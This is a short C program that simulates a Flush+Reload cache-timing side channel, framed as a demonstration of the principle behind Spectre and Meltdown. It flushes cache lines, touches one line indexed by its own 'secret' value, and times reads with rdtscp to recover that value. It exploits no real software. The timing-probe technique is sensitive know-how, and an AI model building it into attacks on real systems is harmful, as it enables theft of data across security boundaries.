#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

/**
 * HARDWARE EXPLOIT SIMULATION: Cache Timing Attack
 * Demonstrates the core principle of Spectre/Meltdown: 
 * Leaking secrets through time differences in CPU cache access.
 */

#define CACHE_LINE_SIZE 64
#define TEST_ARRAY_SIZE 256 * CACHE_LINE_SIZE

uint8_t shared_array[TEST_ARRAY_SIZE];
uint8_t secret_value = 42; // The 'Zero-Day' secret we want to leak

void access_memory(int index) {
    // Simulating memory access based on secret data
    volatile uint8_t temp = shared_array[index * CACHE_LINE_SIZE];
}

int main() {
    uint64_t t1, t2;
    uint32_t junk;

    printf("--- HARDWARE SIDE-CHANNEL DEMO ---\n");
    
    // 1. Flush the cache (Simulated via clflush)
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&shared_array[i * CACHE_LINE_SIZE]);
    }

    // 2. Access a specific index (Triggered by a speculative branch/access)
    access_memory(secret_value);

    // 3. Measure access time for all possible values (The 'Leak')
    printf("Scanning cache access times...\n");
    for (int i = 0; i < 256; i++) {
        t1 = __rdtscp(&junk);
        volatile uint8_t temp = shared_array[i * CACHE_LINE_SIZE];
        t2 = __rdtscp(&junk) - t1;

        // If access is fast (< 100 cycles), it was in the cache!
        if (t2 < 100) {
            printf("[FOUND] Value %d is in cache (Time: %lu cycles)\n", i, t2);
            if (i == secret_value) {
                printf("SUCCESS: Secret leaked through hardware timing side-channel!\n");
            }
        }
    }

    return 0;
}
